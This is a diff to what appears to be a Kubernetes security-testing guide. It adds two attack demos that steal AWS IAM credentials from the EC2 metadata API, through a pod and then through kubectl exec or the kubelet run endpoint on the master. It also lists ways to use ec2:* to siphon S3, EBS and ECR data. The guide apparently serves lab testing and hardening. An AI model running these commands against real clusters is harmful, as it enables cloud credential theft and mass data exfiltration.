@@ -135,7 +135,42 @@ $ exit
 $ ssh -i ~/path-to/kube.pem admin@ip
 ```
 
-### Attack Demo #7 - EC2
+### Attack Demo #7 - EC2 Metadata Worker IAM Credentials
+* Steps: 1) Curl the metadata api, 2) Export credentials, 3) Use the ec2 api's.
+```bash
+# 1. Returns keys that, though rotating, are valid for a few hours.
+$ curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-worker-iam-policy
+
+# 2. Place creds in env vars.
+$ export AWS_REGION=us-east-1
+$ export AWS_ACCESS_KEY_ID=MyAccessKeyID
+$ export AWS_SECRET_ACCESS_KEY=MySecretAccessKey
+$ export AWS_SESSION_TOKEN=MySessionToken
+
+# 3. Enumerate instances, get all user-data scripts.
+$ aws ec2 describe-instances
+$ aws ec2 describe-instance-attribute --instance-id i-xxxxx --attribute userData
+```
+* On the master node, it is common to have the metadata api iam permission `ec2:*` => We want this, thus, we want the curl command to originate on the master node. Which leads us to our next attack.
+
+### Attack Demo #8 - EC2 Metadata IAM Creds
+* Requires that the API request originates from the Master.
+* Possible Vectors: 1) Compromise existing pod running on master, 2) On/against the master node, kubectl exec into a pod (create a pod if needed), 3) On/against the master node, kubelet api `run cmd`.
+```bash
+$ kubectl exec -it etcd-0000 curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-master-iam-policy
+
+# OR
+
+$ curl -sk https://10.0.0.1:10250/run/kube-system/etcd-000/etcd-server -d "cmd=curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-master-iam-policy"
+```
+* With `ec2:*`, we can...
+  * Steal drive contents of all ec2 instances.
+  * Create new instances, new vpc, security group, ssh key pairs.
+  * enumerate all instances in all regions.
+  * create and mount snapshots of all ebs volumes and view all data.
+  * Inspect all ecr docker containers.
+  * Enumerate and download locally all ecr docker images for baked in accounts and secrets.
+  * Read all S3 contents => siphon all s3 bucket contents.
 
 ## AKS Security Testing
 We are going to start with locking down our AKS cluster using `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS)against the master and control plane components. It sets specific guidelines that help you secure your cluster setup. Since AKS is managed by Azure, we cannot run `kube-bench` against our master nodes, so everything in this section will be used only on worker nodes/non-master control plane components.
